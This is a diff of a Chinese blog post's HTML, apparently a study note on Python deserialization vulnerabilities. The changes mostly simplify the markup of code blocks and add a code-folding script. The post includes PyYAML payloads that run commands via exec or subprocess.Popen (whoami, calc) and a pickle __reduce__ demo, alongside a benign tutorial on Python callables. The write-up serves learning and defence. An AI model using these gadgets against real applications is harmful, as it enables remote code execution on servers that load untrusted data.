-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
+</span></span></code></pre></div><p>除此之外网上还有很多大佬有其他的payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
 </span></span><span class="line"><span class="cl">!!python/object/new:type
 </span></span><span class="line"><span class="cl">args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]
 </span></span><span class="line"><span class="cl">listitems: &#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#报错但是执行了
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#报错但是执行了
 </span></span><span class="line"><span class="cl">  - !!python/object/new:str
 </span></span><span class="line"><span class="cl">    args: []
 </span></span><span class="line"><span class="cl">    state: !!python/tuple
@@ -897,27 +619,13 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">    args: [0]
 </span></span><span class="line"><span class="cl">    state:
 </span></span><span class="line"><span class="cl">        update: !!python/name:exec
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">-</span> <span class="o">!!</span><span class="n">python</span><span class="o">/</span><span class="n">object</span><span class="o">/</span><span class="n">new</span><span class="p">:</span><span class="n">yaml</span><span class="o">.</span><span class="n">MappingNode</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">-</span> <span class="o">!!</span><span class="n">python</span><span class="o">/</span><span class="n">object</span><span class="o">/</span><span class="n">new</span><span class="p">:</span><span class="n">yaml</span><span class="o">.</span><span class="n">MappingNode</span>
 </span></span><span class="line"><span class="cl"><span class="n">listitems</span><span class="p">:</span> <span class="o">!!</span><span class="nb">str</span> <span class="s1">&#39;!!python/object/apply:subprocess.Popen [whoami]&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">state</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">tag</span><span class="p">:</span> <span class="o">!!</span><span class="nb">str</span> <span class="n">dummy</span>
 </span></span><span class="line"><span class="cl">    <span class="n">value</span><span class="p">:</span> <span class="o">!!</span><span class="nb">str</span> <span class="n">dummy</span>
 </span></span><span class="line"><span class="cl">    <span class="n">extend</span><span class="p">:</span> <span class="o">!!</span><span class="n">python</span><span class="o">/</span><span class="n">name</span><span class="p">:</span><span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>参考：</p>
+</span></span></code></pre></div><p>参考：</p>
 <blockquote>
 <p><a class="link" href="https://forum.butian.net/share/2288"  target="_blank" rel="noopener"
     >PyYaml反序列化漏洞</a></p></blockquote>
@@ -932,21 +640,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 <li>可能将对象 Pickle 后在网络中传输.</li>
 </ol>
 <p>基本 Payload</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">Demo</span><span class="p">(</span><span class="n">object</span><span class="p">):</span>
@@ -956,24 +650,9 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">demo</span> <span class="o">=</span> <span class="n">Demo</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">))</span>  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h5 id="marshal-反序列化">Marshal 反序列化
+</span></span></code></pre></div><h5 id="marshal-反序列化">Marshal 反序列化
 </h5><p>由于pickle无法序列化code对象, 因此在python2.6后增加了一个marshal模块来处理code对象的序列化问题.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import base64
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import base64
 </span></span><span class="line"><span class="cl">import marshal
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">def demo():
@@ -982,43 +661,19 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">code_serialized = base64.b64encode(marshal.dumps(demo()))
 </span></span><span class="line"><span class="cl">print(code_serialized)  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>但是marshal不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
+</span></span></code></pre></div><p>但是marshal不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
 <p>Pyload(PyYaml &gt;= 5.1)</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;!!python/object/apply:subprocess.Popen
 </span></span></span><span class="line"><span class="cl"><span class="s2">- calc&#34;&#34;&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">deserialized_data</span> <span class="o">=</span> <span class="nb">load</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">Loader</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">deserialized_data</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="o">*</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;!!python/object/apply:subprocess.Popen
 </span></span></span><span class="line"><span class="cl"><span class="s2">- calc&#34;&#34;&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">deserialized_data</span> <span class="o">=</span> <span class="n">unsafe_load</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">deserialized_data</span><span class="p">)</span>  
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>参考：</p>
+</span></span></code></pre></div><p>参考：</p>
 <blockquote>
 <p><a class="link" href="https://ucasers.cn/python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e4%b8%8e%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/#"  target="_blank" rel="noopener"
     >Python反序列化漏洞与沙箱逃逸</a></p></blockquote>
@@ -1040,21 +695,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </h4><ul>
 <li>
 <p>包括内置函数、自定义函数、Lambda 函数。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">def greet(name):
 </span></span><span class="line"><span class="cl">    print(f&#34;Hello, {name}!&#34;)
 </span></span><span class="line"><span class="cl">
@@ -1064,63 +705,27 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl"># Lambda 也是可调用的
 </span></span><span class="line"><span class="cl">add = lambda a, b: a + b
 </span></span><span class="line"><span class="cl">print(add(3, 5))  # 输出 8
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h4 id="2-类class"><strong>(2) 类（Class）</strong>
 </h4><ul>
 <li>
 <p>类本身是可调用的</p>
 <p>，调用类会创建它的实例。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">class Dog:
 </span></span><span class="line"><span class="cl">    def __init__(self, name):
 </span></span><span class="line"><span class="cl">        self.name = name
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"># 调用类创建实例
 </span></span><span class="line"><span class="cl">my_dog = Dog(&#34;Buddy&#34;)  # Dog 类是可调用的
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h4 id="3-方法method"><strong>(3) 方法（Method）</strong>
 </h4><ul>
 <li>
 <p>类中定义的方法（实例方法、类方法、静态方法）。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">class Calculator:
 </span></span><span class="line"><span class="cl">    def add(self, a, b):  # 实例方法
 </span></span><span class="line"><span class="cl">        return a + b
@@ -1137,38 +742,15 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">calc.add(2, 3)           # 实例方法调用
 </span></span><span class="line"><span class="cl">Calculator.multiply(2, 3)  # 类方法调用
 </span></span><span class="line"><span class="cl">Calculator.subtract(5, 2)  # 静态方法调用
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h4 id="4-实现了"><strong>(4) 实现了 <code>__call__</code> 方法的对象</strong>
 </h4><ul>
 <li>
 <p>如果一个类定义了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__call__
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>方法，它的实例会成为可调用对象。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__call__
+</span></span></code></pre></div><p>方法，它的实例会成为可调用对象。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">class Adder:
 </span></span><span class="line"><span class="cl">    def __init__(self, x):
 </span></span><span class="line"><span class="cl">        self.x = x
@@ -1178,36 +760,15 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">add_5 = Adder(5)
 </span></span><span class="line"><span class="cl">print(add_5(3))  # 输出 8（等价于 add_5.__call__(3)）
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h4 id="5-其他内置可调用对象"><strong>(5) 其他内置可调用对象</strong>
 </h4><ul>
 <li>
 <p>生成器函数、部分函数（</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">functools</span><span class="o">.</span><span class="n">partial</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>）等。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">functools</span><span class="o">.</span><span class="n">partial</span>
+</span></span></code></pre></div><p>）等。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">functools</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">power</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="nb">exp</span><span class="p">):</span>
@@ -1215,66 +776,33 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">square</span> <span class="o">=</span> <span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="p">(</span><span class="n">power</span><span class="p">,</span> <span class="nb">exp</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># 部分函数</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">square</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>  <span class="c1"># 输出 9</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <hr>
 <h3 id="2-如何判断一个对象是否可调用"><strong>2. 如何判断一个对象是否可调用？</strong>
 </h3><p>使用内置函数 <code>callable()</code> 可以检测对象是否可调用：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">print(callable(len))        # True（内置函数）
 </span></span><span class="line"><span class="cl">print(callable(&#34;hello&#34;))    # False（字符串不可调用）
 </span></span><span class="line"><span class="cl">print(callable(Adder(5)))   # True（实现了 __call__ 的实例）
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
+</span></span></code></pre></div><hr>
 <h3 id="3-不可调用的对象示例"><strong>3. 不可调用的对象示例</strong>
 </h3><ul>
 <li>
 <p><strong>基础数据类型</strong>：整数、字符串、列表等。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">x = 42
 </span></span><span class="line"><span class="cl">x()  # 报错：&#39;int&#39; object is not callable
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 <li>
 <p><strong>未实现 <code>__call__</code> 的实例</strong>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">class Cat:
 </span></span><span class="line"><span class="cl">    pass
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">my_cat = Cat()
 </span></span><span class="line"><span class="cl">my_cat()  # 报错：&#39;Cat&#39; object is not callable
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <hr>
 <h3 id="4-callable-的实际应用场景"><strong>4. Callable 的实际应用场景</strong>
@@ -1284,23 +812,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 <ul>
 <li>
 <p>装饰器本身必须是可调用对象（函数或类）。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">def logger(func):
 </span></span><span class="line"><span class="cl">    def wrapper(*args, **kwargs):
 </span></span><span class="line"><span class="cl">        print(f&#34;Calling {func.__name__}&#34;)
@@ -1312,9 +824,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">    print(&#34;Hello!&#34;)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">say_hello()  # 输出 &#34;Calling say_hello&#34; 和 &#34;Hello!&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 <li>
@@ -1322,25 +832,13 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 <ul>
 <li>
 <p>通过变量名动态调用函数。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">def do_operation(op, a, b):
 </span></span><span class="line"><span class="cl">    operations = {&#34;add&#34;: lambda x, y: x + y, &#34;mul&#34;: lambda x, y: x * y}
 </span></span><span class="line"><span class="cl">    return operations[op](a, b)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">print(do_operation(&#34;add&#34;, 3, 5))  # 输出 8
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 <li>
@@ -1348,20 +846,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 <ul>
 <li>
 <p>将函数作为参数传递，在特定事件发生时调用。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
 </span></span><span class="line"><span class="cl">def on_button_click(callback):
 </span></span><span class="line"><span class="cl">    print(&#34;按钮被点击了！&#34;)
 </span></span><span class="line"><span class="cl">    callback()
@@ -1370,9 +855,7 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
 </span></span><span class="line"><span class="cl">    print(&#34;执行回调函数&#34;)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">on_button_click(show_message)
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 </ol>
@@ -1592,6 +1075,51 @@ Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高�
         document.head.appendChild(customFont);
     }());
 </script>
+  <script>
+    (function () {
+      const maxHeight = 420;
 
+      function initCodeFold() {
+        document
+          .querySelectorAll(".article-content .highlight")
+          .forEach(function (block) {
+            if (block.dataset.codeFoldInit === "true") return;
+
+            block.dataset.codeFoldInit = "true";
+
+            if (block.scrollHeight <= maxHeight + 40) return;
+
+            const wrapper = document.createElement("div");
+            wrapper.className = "code-fold-wrapper";
+
+            block.parentNode.insertBefore(wrapper, block);
+            wrapper.appendChild(block);
+
+            block.classList.add("code-collapsible", "code-collapsed");
+
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "code-toggle-button";
+            button.textContent = "展开代码";
+            button.setAttribute("aria-expanded", "false");
+
+            button.addEventListener("click", function () {
+              const collapsed = block.classList.toggle("code-collapsed");
+
+              button.textContent = collapsed ? "展开代码" : "收起代码";
+              button.setAttribute("aria-expanded", String(!collapsed));
+            });
+
+            wrapper.appendChild(button);
+          });
+      }
+
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initCodeFold);
+      } else {
+        initCodeFold();
+      }
+    })();
+  </script>
     </body>
 </html>
